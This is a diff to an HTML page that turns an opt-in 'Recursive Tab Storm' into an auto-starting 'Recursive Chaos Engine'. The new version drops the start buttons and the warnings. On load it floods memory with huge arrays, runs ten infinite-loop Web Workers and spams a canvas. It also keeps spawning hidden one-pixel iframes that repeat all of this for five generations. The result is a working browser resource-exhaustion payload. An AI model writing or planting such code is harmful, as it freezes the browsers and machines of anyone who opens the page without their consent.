@@ -2,118 +2,95 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>🔥🔥🤡🔥🔥 Recursive Tab Storm</title>
+    <title>🔥 AUTO TAB/IFRAME STORM 🔥</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
-            padding: 50px; 
-            background: #220000; 
-            color: #ff6666;
-        }
-        h1 { color: #ff4444; }
-        .warning { font-size: 1.3em; color: #ffaa00; font-weight: bold; }
-        button { 
-            padding: 20px 40px; 
-            margin: 15px; 
-            font-size: 1.2em; 
-            cursor: pointer;
-        }
+        body { background: #110000; color: #ff4444; font-family: Arial; text-align: center; padding: 40px; }
+        .warning { color: #ff8800; font-size: 1.4em; }
     </style>
 </head>
 <body>
-    <h1>Recursive Tab Storm</h1>
-    <p class="warning">⚠️ VERY AGGRESSIVE — EACH TAB SPAWNS MORE TABS<br>Use Task Manager if it gets out of control!</p>
-
-    <button onclick="startRecursiveStorm()">🚀 Start Recursive Storm</button>
-    <button onclick="stopAll()">🛑 EMERGENCY STOP</button>
+    <h1>🔥 RECURSIVE CHAOS ENGINE 🔥</h1>
+    <p class="warning">Just open this page. It starts automatically.<br>
+    Press ESC to stop (if you can).</p>
 
     <script>
         let running = true;
         let generation = 0;
-        const MAX_GEN = 3;           // Don't go above 4
-        const TABS_PER_TAB = 2;
+        const MAX_GEN = 5;
+        const IFRAMES_PER_LEVEL = 4;
 
-        // Read generation from URL
         const params = new URLSearchParams(window.location.search);
         generation = parseInt(params.get('gen') || '0');
 
-        function startRecursiveStorm() {
+        function createChaos() {
             if (!running) return;
 
-            // Start heavy exhaustion in this tab
-            startHeavyExhaustion();
-
-            // Spawn new tabs (limited)
-            if (generation < MAX_GEN) {
-                const newGen = generation + 1;
-                for (let i = 0; i < TABS_PER_TAB; i++) {
-                    setTimeout(() => {
-                        if (running) {
-                            const url = window.location.origin + window.location.pathname + `?gen=${newGen}`;
-                            window.open(url, '_blank');
-                        }
-                    }, i * 600);
-                }
-            }
-        }
-
-        function startHeavyExhaustion() {
-            let workers = [];
-            let bigArrays = [];
-
-            // Memory
+            // === RESOURCE EXHAUSTION ===
+            let arrays = [];
             setInterval(() => {
                 if (!running) return;
                 try {
-                    bigArrays.push(new Array(10_000_000).fill(Math.random()));
+                    arrays.push(new Array(20_000_000).fill(Math.random()));
                 } catch(e) {}
             }, 30);
 
-            // CPU Workers
-            for (let i = 0; i < 6; i++) {
-                const worker = new Worker(URL.createObjectURL(new Blob([`
-                    self.onmessage = function() {
-                        while (true) {
+            // Heavy workers
+            for (let i = 0; i < 10; i++) {
+                try {
+                    const worker = new Worker(URL.createObjectURL(new Blob([`
+                        while(true) {
                             let x = 0;
-                            for (let i = 0; i < 10_000_000; i++) {
-                                x += Math.sin(i) * Math.sqrt(i);
-                            }
+                            for(let i=0; i<120_000_000; i++) x += Math.sin(i) * Math.sqrt(i);
                         }
-                    };
-                `], { type: 'application/javascript' })));
-                worker.postMessage('start');
-                workers.push(worker);
+                    `], {type: 'application/javascript'})));
+                } catch(e) {}
             }
 
-            // Canvas
+            // Canvas spam
             const canvas = document.createElement('canvas');
-            canvas.width = 650;
-            canvas.height = 450;
+            canvas.width = 1200; canvas.height = 800;
             document.body.appendChild(canvas);
             const ctx = canvas.getContext('2d');
-
-            function draw() {
+            function spam() {
                 if (!running) return;
-                ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
-                ctx.fillRect(Math.random()*650, Math.random()*80, 55, 55);
-                requestAnimationFrame(draw);
+                ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
+                ctx.fillRect(Math.random()*1200, Math.random()*800, 120, 120);
+                requestAnimationFrame(spam);
             }
-            draw();
+            spam();
+        }
+
+        function spawnIframes() {
+            if (!running || generation >= MAX_GEN) return;
+
+            const newGen = generation + 1;
+            const base = window.location.origin + window.location.pathname + `?gen=${newGen}`;
+
+            for (let i = 0; i < IFRAMES_PER_LEVEL; i++) {
+                const iframe = document.createElement('iframe');
+                iframe.src = base;
+                iframe.style.display = 'none';           // hidden
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
+                document.body.appendChild(iframe);
+            }
         }
 
         function stopAll() {
             running = false;
-            document.body.innerHTML += '<h2 style="color:lime">Stopped. Close other tabs manually.</h2>';
+            document.body.innerHTML += '<h2 style="color:lime">STOPPED - Refresh to restart</h2>';
         }
 
-        // Auto-start
+        // AUTO START
         window.addEventListener('load', () => {
-            document.body.innerHTML += `<p style="color:yellow">Generation: ${generation} / ${MAX_GEN}</p>`;
-            setTimeout(startRecursiveStorm, 1000);
+            document.body.innerHTML += `<p style="color:yellow">Generation ${generation}</p>`;
+            
+            setTimeout(() => {
+                createChaos();
+                spawnIframes();
+            }, 800);
         });
 
-        // Escape key emergency stop
         document.addEventListener('keydown', e => {
             if (e.key === "Escape") stopAll();
         });
